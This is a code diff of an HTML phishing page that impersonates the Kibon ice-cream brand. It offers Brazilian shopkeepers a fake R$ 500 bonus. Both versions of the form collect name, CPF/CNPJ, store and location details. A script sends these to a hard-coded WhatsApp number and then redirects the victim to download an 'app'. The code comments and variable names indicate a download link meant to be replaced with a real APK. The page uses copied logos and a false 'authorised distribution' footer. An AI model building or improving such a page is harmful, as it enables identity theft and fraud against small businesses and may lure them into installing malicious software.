@@ -3,156 +3,232 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kibon - Cadastro e Bônus Oficial</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>Kibon - Portal do Parceiro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --kibon-red: #e2001a; --kibon-dark: #b80015; --green: #28a745; }
-        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-        body { background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
-        
+        /* IDENTIDADE VISUAL OFICIAL KIBON */
+        :root {
+            --kibon-red: #E2001A;
+            --kibon-yellow: #FFD700;
+            --kibon-white: #FFFFFF;
+            --bg-gray: #F4F4F4;
+        }
+
+        * { box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
+
+        body {
+            background-color: var(--bg-gray);
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+
         .card {
-            background: white; width: 100%; max-width: 480px; border-radius: 24px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden;
+            background: var(--kibon-white);
+            width: 100%;
+            max-width: 480px;
+            border-radius: 30px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            overflow: hidden;
+            border: 2px solid #eee;
         }
 
-        .bonus-badge {
-            background: var(--green); color: white; text-align: center;
-            padding: 12px; font-weight: 700; font-size: 14px;
-            text-transform: uppercase; letter-spacing: 1px;
+        /* Banner Superior com Amarelo Kibon */
+        .bonus-banner {
+            background: var(--kibon-yellow);
+            color: var(--kibon-red);
+            text-align: center;
+            padding: 12px;
+            font-weight: 800;
+            font-size: 14px;
+            text-transform: uppercase;
+            border-bottom: 3px solid var(--kibon-red);
         }
 
-        .header { padding: 30px 20px 10px; text-align: center; }
-        
-        /* NOVO LINK DE IMAGEM GARANTIDO */
-        .logo-kibon { width: 150px; height: auto; margin-bottom: 15px; }
-        
-        .header h1 { font-size: 22px; color: var(--kibon-red); margin: 0; font-weight: 700; }
-        .header p { font-size: 13px; color: #666; margin-top: 5px; }
+        .header {
+            padding: 30px 20px 10px;
+            text-align: center;
+        }
 
-        .form-body { padding: 20px 25px; }
+        /* Logo oficial */
+        .logo-kibon {
+            width: 160px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            color: var(--kibon-red);
+            margin: 10px 0;
+            font-weight: 800;
+        }
+
+        .form-body { padding: 0 25px 30px; }
+
         .input-group { margin-bottom: 12px; }
-        label { display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 4px; }
-        input, select {
-            width: 100%; padding: 12px; border: 2px solid #eee; border-radius: 10px;
-            font-size: 14px; transition: 0.3s; outline: none; background: #fafafa;
-        }
-        input:focus { border-color: var(--kibon-red); background: #fff; }
 
-        .info-bonus {
-            background: #fff9f0; border: 2px dashed #ffcc00; border-radius: 12px;
-            padding: 15px; margin-top: 15px; text-align: center; font-size: 14px;
+        label {
+            display: block;
+            font-size: 11px;
+            font-weight: 700;
+            color: #666;
+            margin-bottom: 4px;
+            text-transform: uppercase;
         }
-        .info-bonus b { color: var(--green); font-size: 18px; display: block; margin-top: 5px; }
 
-        .btn-main {
-            width: 100%; padding: 18px; background: var(--kibon-red); color: white;
-            border: none; border-radius: 14px; font-size: 16px; font-weight: 700;
-            cursor: pointer; transition: 0.3s; margin-top: 20px; box-shadow: 0 4px 10px rgba(226, 0, 26, 0.3);
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #f0f0f0;
+            border-radius: 15px;
+            font-size: 14px;
+            background: #fafafa;
+            outline: none;
+            transition: 0.3s;
         }
-        .btn-main:hover { background: var(--kibon-dark); transform: scale(1.02); }
 
-        .footer { text-align: center; padding: 15px; font-size: 11px; color: #999; }
+        input:focus {
+            border-color: var(--kibon-red);
+            background: #fff;
+        }
+
+        .bonus-box {
+            background: #FFF9F0;
+            border: 2px solid var(--kibon-yellow);
+            border-radius: 20px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .bonus-box p { margin: 0; font-size: 13px; color: #444; }
+        .bonus-box b { 
+            color: var(--kibon-red); 
+            font-size: 20px; 
+            display: block;
+            margin-top: 5px;
+        }
+
+        /* Botão Vermelho Kibon Oficial */
+        .btn-kibon {
+            width: 100%;
+            padding: 18px;
+            background: var(--kibon-red);
+            color: white;
+            border: none;
+            border-radius: 50px; /* Botão bem arredondado como a marca */
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 6px 15px rgba(226, 0, 26, 0.3);
+        }
+
+        .btn-kibon:hover {
+            background: #c10016;
+            transform: scale(1.02);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 10px;
+            color: #aaa;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="bonus-badge">🎁 Bônus de R$ 500,00 Disponível</div>
+    <div class="bonus-banner">🎁 SALDO EXCLUSIVO DE R$ 500,00 DISPONÍVEL</div>
     
     <div class="header">
-        <img src="https://www.kibon.com.br/content/dam/unilever/heart/brazil/online_comms/kibon-logo.png" alt="Kibon" class="logo-kibon">
-        <h1>Cadastro de Parceiro</h1>
-        <p>Complete seu registro para liberar o saldo</p>
+        <img src="https://logodownload.org/wp-content/uploads/2017/05/kibon-logo-1.png" alt="Kibon" class="logo-kibon">
+        <h1>Seja um Parceiro</h1>
     </div>
 
     <form class="form-body">
         <div class="input-group">
-            <label>Nome Completo do Titular</label>
-            <input type="text" id="nome" placeholder="Seu nome" required>
+            <label>Nome do Responsável</label>
+            <input type="text" id="nome" placeholder="Seu nome completo">
         </div>
 
         <div class="input-group">
             <label>CPF ou CNPJ</label>
-            <input type="text" id="documento" placeholder="000.000.000-00" required>
+            <input type="text" id="documento" placeholder="000.000.000-00">
         </div>
 
         <div class="input-group">
-            <label>Nome do Comércio (Fantasia)</label>
-            <input type="text" id="comercio" placeholder="Nome da sua loja" required>
+            <label>Nome do Comércio</label>
+            <input type="text" id="comercio" placeholder="Nome da Loja">
         </div>
 
         <div style="display: flex; gap: 10px;">
-            <div class="input-group" style="flex: 2;">
+            <div style="flex: 2;">
                 <label>Cidade</label>
-                <input type="text" id="cidade" placeholder="Cidade" required>
+                <input type="text" id="cidade" placeholder="Cidade">
             </div>
-            <div class="input-group" style="flex: 1;">
-                <label>Estado</label>
-                <input type="text" id="estado" placeholder="UF" maxlength="2" required>
+            <div style="flex: 1;">
+                <label>UF</label>
+                <input type="text" id="estado" maxlength="2" placeholder="Ex: RS">
             </div>
         </div>
 
         <div class="input-group">
-            <label>Modelo do Aparelho Celular</label>
-            <input type="text" id="celular_modelo" placeholder="Ex: iPhone 15, Galaxy S23" required>
+            <label>Modelo do Celular</label>
+            <input type="text" id="aparelho" placeholder="Ex: iPhone, Samsung S23">
         </div>
 
-        <div class="input-group">
-            <label>Renda Mensal Estimada</label>
-            <input type="text" id="renda" placeholder="R$ 0,00" required>
+        <div class="bonus-box">
+            <p>Após o cadastro, baixe o app e ganhe:</p>
+            <b>R$ 500,00 DE BÔNUS</b>
         </div>
 
-        <div class="input-group">
-            <label>Faturamento Atual do Ponto</label>
-            <input type="text" id="faturamento" placeholder="R$ 0,00" required>
-        </div>
-
-        <div class="info-bonus">
-            Após clicar em concluir, baixe o app e receba:
-            <b>R$ 500,00 DE SALDO BÔNUS</b>
-        </div>
-
-        <button type="button" class="btn-main" onclick="finalizar()">CONCLUIR E RESGATAR BÔNUS</button>
+        <button type="button" class="btn-kibon" onclick="finalizarCadastro()">CONCLUIR E RESGATAR</button>
     </form>
 
-    <div class="footer">© 2026 Distribuidora Autorizada Kibon</div>
+    <div class="footer">© 2026 Kibon Brasil - Distribuição Autorizada</div>
 </div>
 
 <script>
-    function finalizar() {
-        const meuWhatsapp = "5554999422678"; 
-        const urlDownloadAPK = "https://www.kibon.com.br"; // Mude para o seu link real
+    function finalizarCadastro() {
+        const fone = "5554999422678";
+        const linkApp = "https://www.kibon.com.br"; // Link oficial
 
-        const nome = document.getElementById('nome').value;
-        const documento = document.getElementById('documento').value;
-        const comercio = document.getElementById('comercio').value;
-        const modelo = document.getElementById('celular_modelo').value;
-        const cid = document.getElementById('cidade').value;
-        const est = document.getElementById('estado').value;
-        const ren = document.getElementById('renda').value;
-        const fat = document.getElementById('faturamento').value;
+        const campos = {
+            nome: document.getElementById('nome').value,
+            doc: document.getElementById('documento').value,
+            loja: document.getElementById('comercio').value,
+            cid: document.getElementById('cidade').value,
+            uf: document.getElementById('estado').value,
+            cel: document.getElementById('aparelho').value
+        };
 
-        if(!nome || !documento || !comercio || !modelo || !cid || !est || !ren || !fat) {
-            alert("Por favor, preencha todos os campos para liberar seu bônus de R$ 500!");
+        if(Object.values(campos).some(v => v === "")) {
+            alert("Por favor, preencha todos os campos da Kibon!");
             return;
         }
 
-        const msg = `*CADASTRO BÔNUS R$ 500*%0A` +
+        const msg = `*CADASTRO OFICIAL KIBON*%0A` +
                     `----------------------------%0A` +
-                    `👤 *Nome:* ${nome}%0A` +
-                    `📄 *Doc:* ${documento}%0A` +
-                    `🏪 *Loja:* ${comercio}%0A` +
-                    `📱 *Cel:* ${modelo}%0A` +
-                    `📍 *Local:* ${cid} - ${est}%0A` +
-                    `💰 *Renda:* ${ren}%0A` +
-                    `📈 *Fat:* ${fat}%0A` +
+                    `👤 *Titular:* ${campos.nome}%0A` +
+                    `📄 *Doc:* ${campos.doc}%0A` +
+                    `🏪 *Loja:* ${campos.loja}%0A` +
+                    `📍 *Local:* ${campos.cid}-${campos.uf}%0A` +
+                    `📱 *Celular:* ${campos.cel}%0A` +
                     `----------------------------%0A` +
-                    `*AGUARDANDO LIBERAÇÃO DO SALDO*`;
+                    `*RESERVAR BÔNUS DE R$ 500*`;
 
-        window.open(`https://api.whatsapp.com/send?phone=${meuWhatsapp}&text=${msg}`, '_blank');
-
-        alert("Cadastro enviado! Baixe o aplicativo a seguir para resgatar seu saldo de R$ 500.");
-        window.location.href = urlDownloadAPK;
+        window.open(`https://api.whatsapp.com/send?phone=${fone}&text=${msg}`, '_blank');
+        
+        alert("Parabéns! Cadastro enviado. Baixe o aplicativo agora para ativar seu bônus.");
+        window.location.href = linkApp;
     }
 </script>
 
